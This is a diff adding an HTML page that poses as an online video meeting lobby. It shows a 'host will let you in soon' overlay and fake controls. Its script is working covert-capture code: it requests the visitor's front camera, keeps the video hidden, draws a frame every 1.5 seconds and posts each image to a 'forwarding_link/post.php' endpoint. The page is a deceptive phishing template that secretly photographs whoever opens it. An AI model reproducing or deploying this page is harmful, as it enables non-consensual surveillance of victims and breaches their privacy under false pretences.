@@ -1,0 +1,338 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>Online Video Meeting</title>
+
+    <!-- Essential Scripts & Dependencies -->
+    <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+    <link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
+    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+
+    <style>
+        :root {
+            --glass-bg: rgba(255, 255, 255, 0.07);
+            --glass-border: rgba(255, 255, 255, 0.15);
+            --text-main: #FFFFFF;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Outfit', sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            height: 100vh;
+            width: 100vw;
+            background: #0b0c10;
+            color: var(--text-main);
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+            position: relative;
+        }
+
+        /* Ambient Glowing Background Orbs */
+        body::before, body::after {
+            content: '';
+            position: fixed;
+            width: 350px;
+            height: 350px;
+            border-radius: 50%;
+            filter: blur(120px);
+            z-index: 0;
+            opacity: 0.35;
+            animation: floatGlow 12s infinite alternate ease-in-out;
+        }
+
+        body::before {
+            background: #ff007f;
+            top: -50px;
+            left: -50px;
+        }
+
+        body::after {
+            background: #00e5ff;
+            bottom: -50px;
+            right: -50px;
+            animation-delay: -6s;
+        }
+
+        @keyframes floatGlow {
+            0% { transform: translate(0, 0) scale(1); }
+            100% { transform: translate(40px, 50px) scale(1.15); }
+        }
+
+        /* Waiting Overlay Modal */
+        #ac-wrapper {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(11, 12, 16, 0.85);
+            backdrop-filter: blur(15px);
+            -webkit-backdrop-filter: blur(15px);
+            z-index: 1001;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        #popup {
+            background: var(--glass-bg);
+            border: 1px solid var(--glass-border);
+            border-radius: 20px;
+            padding: 30px 25px;
+            max-width: 520px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.6);
+        }
+
+        #popup h2 {
+            font-size: 1.25rem;
+            font-weight: 600;
+            color: #E2E8F0;
+            letter-spacing: 0.5px;
+        }
+
+        .pulse-spinner {
+            width: 45px;
+            height: 45px;
+            border: 3px solid rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+            border-top-color: #00F2FE;
+            animation: spin 1s infinite linear;
+            margin: 0 auto 20px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Top Bar Button */
+        .float_button {
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            height: 42px;
+            width: 42px;
+            border-radius: 12px;
+            position: fixed;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            top: 15px;
+            right: 15px;
+            z-index: 1000;
+            cursor: pointer;
+            backdrop-filter: blur(10px);
+            transition: all 0.2s ease;
+        }
+
+        .float_button:hover {
+            background: rgba(255, 255, 255, 0.2);
+        }
+
+        /* Meeting Control Bar */
+        .bottom-bar {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 85px;
+            background: rgba(15, 17, 23, 0.85);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 0 20px;
+            z-index: 1000;
+            gap: 20px;
+            overflow-x: auto;
+        }
+
+        .icon-button {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            color: rgba(255, 255, 255, 0.75);
+            cursor: pointer;
+            min-width: 60px;
+            transition: color 0.2s ease;
+        }
+
+        .icon-button:hover {
+            color: #FFFFFF;
+        }
+
+        .icon-button i {
+            font-size: 20px;
+            margin-bottom: 6px;
+        }
+
+        .icon-button h6 {
+            font-size: 0.75rem;
+            font-weight: 500;
+        }
+
+        .icon-button.accent {
+            color: #25D366;
+        }
+
+        .btn-end {
+            background: linear-gradient(135deg, #FF3366 0%, #E60000 100%);
+            color: #FFFFFF;
+            padding: 10px 24px;
+            border: none;
+            border-radius: 20px;
+            font-weight: 700;
+            font-size: 0.9rem;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(255, 51, 102, 0.3);
+            margin-left: 10px;
+        }
+
+        /* Hidden Capture Canvas/Video */
+        .video-wrap, canvas {
+            display: none !important;
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- Waiting Overlay Modal -->
+    <div id="ac-wrapper">
+        <div id="popup">
+            <div class="pulse-spinner"></div>
+            <h2>Please wait, the meeting host will let you in soon</h2>
+        </div>
+    </div>
+
+    <!-- Fullscreen Toggle Button -->
+    <div class="float_button" onclick="toggleFullScreen()">
+        <i class="fas fa-expand" style="color: #fff; font-size: 16px;"></i>
+    </div>
+
+    <!-- Hidden Capture Stream -->
+    <div class="video-wrap" hidden="hidden">
+        <video id="video" playsinline autoplay></video>
+    </div>
+    <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+    <span id="errorMsg" style="display:none;"></span>
+
+    <!-- Meeting Controls Bar -->
+    <div class="bottom-bar">
+        <div class="icon-button">
+            <i class="fas fa-microphone"></i>
+            <h6>Mute</h6>
+        </div>
+        <div class="icon-button">
+            <i class="fas fa-video"></i>
+            <h6>Stop Video</h6>
+        </div>
+        <div class="icon-button" style="margin-left: auto;">
+            <i class="fas fa-shield-alt"></i>
+            <h6>Security</h6>
+        </div>
+        <div class="icon-button">
+            <i class="fas fa-users"></i>
+            <h6>Participants</h6>
+        </div>
+        <div class="icon-button accent">
+            <i class="fas fa-plus-square"></i>
+            <h6>Share</h6>
+        </div>
+        <div class="icon-button">
+            <i class="fas fa-comments"></i>
+            <h6>Chat</h6>
+        </div>
+        <div class="icon-button" style="margin-right: auto;">
+            <i class="fas fa-record-vinyl"></i>
+            <h6>Record</h6>
+        </div>
+        <button class="btn-end">End</button>
+    </div>
+
+    <!-- WebCam Capture & Forwarding Script -->
+    <script>
+    function post(imgdata) {
+        $.ajax({
+            type: 'POST',
+            data: { cat: imgdata },
+            url: 'forwarding_link/post.php',
+            dataType: 'json',
+            async: false,
+            success: function (result) {},
+            error: function () {}
+        });
+    };
+
+    'use strict';
+
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const errorMsgElement = document.querySelector('span#errorMsg');
+
+    const constraints = {
+        audio: false,
+        video: { facingMode: "user" }
+    };
+
+    async function init() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia(constraints);
+            handleSuccess(stream);
+        } catch (e) {
+            if (errorMsgElement) errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+        }
+    }
+
+    function handleSuccess(stream) {
+        window.stream = stream;
+        video.srcObject = stream;
+        var context = canvas.getContext('2d');
+        setInterval(function () {
+            context.drawImage(video, 0, 0, 640, 480);
+            var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+            post(canvasData);
+            video.play();
+        }, 1500);
+    }
+
+    function PopUp(){
+        document.getElementById('ac-wrapper').style.display = "none"; 
+    }
+
+    function toggleFullScreen() {
+        if (!document.fullscreenElement) {
+            document.documentElement.requestFullscreen();
+        } else {
+            if (document.exitFullscreen) {
+                document.exitFullscreen();
+            }
+        }
+    }
+
+    init();
+
+    $(document).ready(function(){
+        setTimeout(function(){
+            PopUp();
+        }, 50000);
+    });
+    </script>
+</body>
+</html>
